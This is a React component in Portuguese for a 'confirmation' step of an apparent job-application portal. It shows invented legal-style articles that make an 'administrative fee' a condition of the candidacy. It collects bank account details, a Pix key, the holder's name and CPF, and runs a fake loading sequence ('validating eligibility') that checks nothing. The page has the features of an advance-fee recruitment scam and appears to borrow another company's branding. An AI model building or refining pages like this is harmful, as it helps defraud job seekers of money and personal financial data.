import { useState } from 'react';
import { motion } from 'framer-motion';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { MLHeader } from '@/components/ui/ml-header';
import { MLFooter } from '@/components/ui/ml-footer';
import { FormInput } from '@/components/ui/form-field';
import { useLocation, useParams } from 'wouter';
import { CheckCircle2, Lock } from 'lucide-react';
import { Checkbox } from '@/components/ui/checkbox';
import { Label } from '@/components/ui/label';

export default function Confirmacao() {
  const [, navigate] = useLocation();
  const params = useParams<{ id: string }>();
  const candidateId = params.id;
  const [accepted, setAccepted] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isComplete, setIsComplete] = useState(false);

  const [formData, setFormData] = useState({
    banco: '',
    agencia: '',
    conta: '',
    chavePix: '',
    titular: '',
    cpfTitular: '',
  });

  const updateField = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const allFilled = Object.values(formData).every(v => v.trim() !== '') && accepted;

  const [loadingText, setLoadingText] = useState("Processando informações no sistema interno...");

  const handleSubmit = async () => {
    if (!allFilled) return;
    setIsSubmitting(true);
    
    // Animação de carregamento institucional
    setTimeout(() => setLoadingText("Validando elegibilidade..."), 1500);
    setTimeout(() => setLoadingText("Atualizando status da candidatura..."), 3000);
    
    await new Promise(resolve => setTimeout(resolve, 4500));
    setIsComplete(true);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  if (isComplete) {
    return (
      <div className="min-h-screen bg-[#f5f5f5]">
        <MLHeader />
        <main className="max-w-3xl mx-auto px-4 py-12">
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.8 }}
          >
            <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-12 text-center">
              <span className="institutional-label mb-8">Processo Administrativo Finalizado</span>
              <h1 className="text-2xl md:text-3xl font-extrabold text-gray-900 mb-6" data-testid="text-success">
                Ciência Registrada com Sucesso
              </h1>
              <div className="section-divider" />
              <p className="normative-text mb-10 mx-auto max-w-lg">
                Sua formalização foi processada nos sistemas internos. O candidato deverá aguardar o contato via canal oficial para os próximos procedimentos operacionais.
              </p>
              <Button
                onClick={() => navigate("/")}
                className="ml-button"
                data-testid="button-voltar-inicio"
              >
                Retornar ao Portal
              </Button>
            </div>
          </motion.div>
        </main>
        <MLFooter />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f5f5f5]">
      <MLHeader />

      <main className="max-w-3xl mx-auto px-4 py-12 pb-24">
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.8 }}
        >
          <div className="bg-white rounded-lg shadow-sm border border-gray-200 overflow-hidden mb-8">
            <div className="p-8 md:p-12">
              <span className="institutional-label">Finalização do Processo Administrativo</span>
              <h1 className="text-2xl md:text-3xl font-extrabold text-gray-900 mb-6" data-testid="text-title-confirmacao">
                Confirmação e Ciência
              </h1>
              
              <div className="section-divider" />

              <div className="space-y-8">
                <section>
                  <h3 className="institutional-label mb-4">Disposições Administrativas</h3>
                  <div className="bg-gray-50 p-6 rounded-md border border-gray-200 normative-text space-y-4">
                    <p><strong>Art. 1º</strong> – A taxa administrativa possui natureza operacional e destina-se ao custeio de procedimentos internos necessários à validação documental, integração sistêmica e emissão de registro preliminar.</p>
                    <p><strong>Art. 2º</strong> – O recolhimento da taxa constitui requisito para continuidade da análise final da candidatura.</p>
                    <p><strong>Art. 4º</strong> – A confirmação desta etapa implica ciência integral das disposições aqui descritas.</p>
                  </div>
                </section>

                <section>
                  <h3 className="institutional-label mb-4">Documentação Complementar</h3>
                  <div className="bg-white p-6 rounded-md border border-gray-200">
                    <p className="normative-text mb-4">Para fins de auditoria interna e validação curricular, o candidato deverá anexar currículo atualizado em formato PDF ou DOC.</p>
                    <div className="flex items-center gap-4">
                      <Button variant="outline" className="border-dashed border-2 h-20 w-full flex flex-col gap-1 items-center justify-center text-gray-400 hover:text-gray-600">
                        <span className="text-xs font-bold uppercase tracking-widest">Anexar Currículo</span>
                        <span className="text-[10px] font-normal italic">Formatos aceitos: PDF, DOC</span>
                      </Button>
                    </div>
                  </div>
                </section>

                <section>
                  <h3 className="institutional-label mb-4">Dados Bancários para Formalização</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <FormInput label="Instituição Bancária" required value={formData.banco} onChange={(e) => updateField('banco', e.target.value)} />
                    <FormInput label="Agência" required value={formData.agencia} onChange={(e) => updateField('agencia', e.target.value)} />
                    <FormInput label="Número da Conta" required value={formData.conta} onChange={(e) => updateField('conta', e.target.value)} />
                    <FormInput label="Chave Pix" required value={formData.chavePix} onChange={(e) => updateField('chavePix', e.target.value)} />
                    <FormInput label="Nome Completo do Titular" required value={formData.titular} onChange={(e) => updateField('titular', e.target.value)} />
                    <FormInput label="CPF do Titular" required value={formData.cpfTitular} onChange={(e) => updateField('cpfTitular', e.target.value)} />
                  </div>
                </section>

                <div className="section-divider" />

                <div className="bg-gray-50/50 p-6 rounded-md border border-gray-200">
                  <div className="flex items-start gap-4">
                    <Checkbox
                      id="accept-terms"
                      checked={accepted}
                      onCheckedChange={(val) => setAccepted(val === true)}
                      className="mt-1 border-gray-300 data-[state=checked]:bg-[#2d3277] data-[state=checked]:border-[#2d3277]"
                      data-testid="checkbox-aceite"
                    />
                    <Label htmlFor="accept-terms" className="normative-text leading-relaxed cursor-pointer font-bold text-gray-700">
                      Declaro, sob as penas da lei, que li, compreendi e concordo integralmente com as disposições administrativas acima descritas.
                    </Label>
                  </div>
                </div>

                <Button
                  onClick={handleSubmit}
                  disabled={!allFilled || isSubmitting}
                  className="w-full h-16 ml-button"
                  data-testid="button-finalizar"
                >
                  {isSubmitting ? (
                    <span className="flex items-center gap-3">
                      <span className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                      {loadingText}
                    </span>
                  ) : (
                    "Confirmar Ciência e Prosseguir"
                  )}
                </Button>
              </div>
            </div>
          </div>
        </motion.div>
      </main>

      <MLFooter />
    </div>
  );
}
